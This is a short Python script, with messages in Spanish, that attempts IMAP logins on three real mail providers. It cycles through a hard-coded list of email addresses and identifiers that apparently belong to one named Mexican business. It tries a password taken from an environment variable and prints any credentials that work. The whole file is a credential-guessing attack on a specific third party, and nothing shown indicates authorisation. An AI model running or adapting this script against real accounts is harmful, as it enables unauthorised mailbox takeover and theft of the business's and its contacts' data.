import imaplib
import logging
import os

logging.basicConfig(level=logging.INFO, format='%(levelname)s - %(message)s')

def brute_force_imap():
    usernames = [
        "contacto@jofrasistemasyequipos.com",
        "JofraSistemasyEquipos2421",
        "651076614",
        "contacto@jofrasistemasyequipos.mx",
        "jofrasistemasyequiposmx@gmail.com",
        "Jofrasoluciones2025@gmail.com"
    ]
    
    imap_pw = os.getenv("IMAP_PASSWORD", "")
    passwords = [imap_pw] if imap_pw else []
    
    hosts = [
        "imap.secureserver.net",
        "outlook.office365.com",
        "imap.titan.email"
    ]
    
    total_combs = len(usernames) * len(passwords) * len(hosts)
    current = 0
    
    print(f"Iniciando prueba de fuerza bruta con {total_combs} combinaciones...")
    
    for host in hosts:
        for user in usernames:
            for pw in passwords:
                current += 1
                try:
                    mail = imaplib.IMAP4_SSL(host, timeout=5)
                    mail.login(user, pw)
                    print(f"\n[!!! EXITO !!!]")
                    print(f"Host: {host}")
                    print(f"Usuario: {user}")
                    print(f"Password: {pw}")
                    mail.logout()
                    return True
                except imaplib.IMAP4.error as e:
                    # Authentication failed is expected, ignore
                    pass
                except Exception as e:
                    pass
                
                if current % 10 == 0:
                    print(f"Progreso: {current}/{total_combs}")
                    
    print("\n[FALLO] Ninguna combinación funcionó.")
    return False

if __name__ == "__main__":
    brute_force_imap()
